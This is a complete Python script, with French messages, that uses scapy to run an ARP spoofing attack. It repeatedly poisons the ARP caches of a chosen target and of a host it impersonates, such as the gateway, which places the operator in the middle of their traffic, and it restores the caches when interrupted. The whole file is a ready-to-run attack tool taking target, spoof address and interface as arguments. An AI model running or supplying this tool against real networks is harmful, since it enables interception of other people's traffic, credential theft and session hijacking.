import scapy.all as scapy
import argparse
from colorama import Fore, init

init(autoreset=True)

class ArpSpoofer:
    def __init__(self, target_ip, spoof_ip, interface):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface

    def get_mac(self, ip):
        request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast / request
        answer = scapy.srp(final_packet, iface=self.interface, timeout=2, verbose=False)[0]
        return answer[0][1].hwsrc

    def spoof(self, target, spoofed):
        mac = self.get_mac(target)
        packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
        scapy.send(packet, iface=self.interface, verbose=False)
        print(Fore.YELLOW + f"Empoisonnement ARP envoyé à {target} en se faisant passer pour {spoofed}")

    def restore(self, dest_ip, source_ip):
        dest_mac = self.get_mac(dest_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, iface=self.interface, verbose=False)
        print(Fore.GREEN + "Restauration du réseau en cours")

    def run(self):
        try:
            while True:
                self.spoof(self.target_ip, self.spoof_ip)
                self.spoof(self.spoof_ip, self.target_ip)
        except KeyboardInterrupt:
            print(Fore.RED + "Arrêt de l'attaque")
            self.restore(self.target_ip, self.spoof_ip)
            self.restore(self.spoof_ip, self.target_ip)
            print(Fore.GREEN + "Réseau restauré")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Outil de spoofing ARP pour analyser le trafic réseau.")
    parser.add_argument("-t", "--target", required=True, help="Adresse IP de la cible.")
    parser.add_argument("-s", "--spoof", required=True, help="Adresse IP à usurper (ex: passerelle).")
    parser.add_argument("-i", "--interface", required=True, help="Interface réseau à utiliser (ex: eth0, wlan0).")

    args = parser.parse_args()

    spoofer = ArpSpoofer(target_ip=args.target, spoof_ip=args.spoof, interface=args.interface)
    spoofer.run()
